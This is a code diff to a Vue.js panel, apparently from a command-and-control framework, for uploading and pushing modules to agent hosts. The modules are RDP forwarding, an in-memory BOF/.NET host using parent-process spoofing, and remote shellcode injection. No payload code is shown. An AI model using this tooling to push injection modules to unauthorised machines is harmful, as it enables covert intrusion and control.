@@ -3,11 +3,13 @@
     <section class="surface-card module-card">
       <div class="panel-head">
         <div>
-          <span class="panel-kicker">L2 Modules</span>
+          <span class="panel-kicker">L2 Modules × 3</span>
           <h3>模块仓库</h3>
           <p class="hint">
-            登记隔离宿主 <code>iso_host</code>（cupcake-iso-host.exe）。
-            插件库放 BOF/.NET <strong>载荷</strong>；运行时会 stage 宿主并在 PPID 伪装短命进程中内存执行。
+            产品仅三个独立模块：
+            <code>desktop</code>（远程桌面）、
+            <code>iso_host</code>（BOF/.NET 隔离宿主）、
+            <code>inject</code>（进程注入）。分文件、分推送。
           </p>
         </div>
         <el-button type="primary" :loading="loading" @click="refresh">
@@ -17,16 +19,16 @@
 
       <div class="workflow">
         <div class="step">
-          <strong>1. 构建宿主</strong>
-          <code>cargo build -p cupcake-iso-host --release</code>
+          <strong>desktop</strong>
+          <span>RDP 3389 转发能力包</span>
         </div>
         <div class="step">
-          <strong>2. 上传登记</strong>
-          <span>ID=<code>iso_host</code>，文件 cupcake-iso-host.exe</span>
+          <strong>iso_host</strong>
+          <span>BOF/.NET 短命宿主 PE</span>
         </div>
         <div class="step">
-          <strong>3. 推送到主机或插件页运行</strong>
-          <span>推送成功会提示；已存活则按钮置灰</span>
+          <strong>inject</strong>
+          <span>远程 shellcode 注入 L2</span>
         </div>
       </div>
 
@@ -35,7 +37,11 @@
       <el-form label-position="top" class="upload-form" @submit.prevent>
         <div class="form-row">
           <el-form-item label="模块 ID" required>
-            <el-input v-model="uploadForm.id" placeholder="iso_host" style="width: 200px" />
+            <el-select v-model="uploadForm.id" style="width: 200px">
+              <el-option label="desktop — 远程桌面" value="desktop" />
+              <el-option label="iso_host — BOF/.NET 宿主" value="iso_host" />
+              <el-option label="inject — 进程注入" value="inject" />
+            </el-select>
           </el-form-item>
           <el-form-item label="模块文件 (.exe / .dll / .bin)" required>
             <input type="file" ref="fileInput" @change="onFileChange" />
@@ -60,7 +66,7 @@
         <el-table-column label="大小" width="100">
           <template #default="{ row }">{{ formatSize(row.size) }}</template>
         </el-table-column>
-        <el-table-column label="操作" min-width="360" fixed="right">
+        <el-table-column label="操作" min-width="420" fixed="right">
           <template #default="{ row }">
             <el-button size="small" @click="packPreview(row)">打包预览</el-button>
             <el-select
@@ -68,7 +74,7 @@
               placeholder="选择在线主机"
               clearable
               filterable
-              style="width: 200px; margin: 0 8px"
+              style="width: 180px; margin: 0 8px"
               @change="() => onTargetChange(row.id)"
             >
               <el-option
@@ -86,6 +92,15 @@
               @click="pushToAgent(row)"
             >
               {{ isPushedAlive(row.id) ? '已在目标存活' : '推送' }}
+            </el-button>
+            <el-button
+              v-if="isAdmin"
+              size="small"
+              type="danger"
+              :loading="deleting === row.id"
+              @click="deleteModule(row)"
+            >
+              删除
             </el-button>
           </template>
         </el-table-column>
@@ -105,12 +120,13 @@
 
 <script setup>
 import { onMounted, reactive, ref } from 'vue'
-import { ElMessage, ElNotification } from 'element-plus'
+import { ElMessage, ElMessageBox, ElNotification } from 'element-plus'
 import api from '../api/index'
 
 const loading = ref(false)
 const uploading = ref(false)
 const pushing = ref('')
+const deleting = ref('')
 const modules = ref([])
 const onlineClients = ref([])
 const pushTarget = reactive({})
@@ -118,6 +134,15 @@ const pushTarget = reactive({})
 const aliveMap = reactive({})
 const packInfo = ref('')
 const fileInput = ref(null)
+
+const userRole = (() => {
+  try {
+    return (JSON.parse(localStorage.getItem('cupcake_user') || '{}').role || 'operator').toLowerCase()
+  } catch {
+    return 'operator'
+  }
+})()
+const isAdmin = userRole === 'admin' || userRole === 'administrator'
 
 const uploadForm = reactive({
   id: 'iso_host',
@@ -227,6 +252,28 @@ const doUpload = async () => {
     })
   } finally {
     uploading.value = false
+  }
+}
+
+const deleteModule = async (row) => {
+  try {
+    await ElMessageBox.confirm(
+      `确定从仓库删除模块「${row.name || row.id}」？磁盘 .bin 将一并移除。`,
+      '删除模块',
+      { type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消' }
+    )
+  } catch {
+    return
+  }
+  deleting.value = row.id
+  try {
+    await api.delete(`/api/modules/${encodeURIComponent(row.id)}`)
+    ElMessage.success(`已删除 ${row.id}`)
+    await refresh()
+  } catch (e) {
+    ElMessage.error(e?.response?.data?.error || '删除失败')
+  } finally {
+    deleting.value = ''
   }
 }
 
